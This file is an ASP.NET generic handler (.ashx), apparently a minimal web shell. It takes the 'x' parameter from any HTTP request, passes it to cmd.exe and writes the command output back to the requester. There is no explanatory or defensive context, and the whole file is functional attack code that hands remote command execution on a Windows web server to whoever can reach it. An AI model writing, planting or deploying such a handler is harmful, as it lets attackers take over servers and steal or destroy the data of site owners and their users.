<%@ WebHandler Language="C#" Class="Handler2" %>
using System;
using System.Collections.Generic; 
using System.Diagnostics;
using System.Web;
public class Handler2 : IHttpHandler {
public void ProcessRequest (HttpContext context) {
//string x = "-an";
string x = context.Request["x"];
Process prc=new Process(); 
prc.StartInfo.FileName="cmd.exe"; 
prc.StartInfo.UseShellExecute=false; 
prc.StartInfo.RedirectStandardInput = true; 
prc.StartInfo.RedirectStandardOutput = true; 
prc.StartInfo.RedirectStandardError = true; 
prc.StartInfo.CreateNoWindow = false; 
prc.Start();
prc.StandardInput.WriteLine(x);
prc.StandardInput.Close();
context.Response.Write(prc.StandardOutput.ReadToEnd());
context.Response.End();}
public bool IsReusable {
        get {
            return false;
        }
    }}
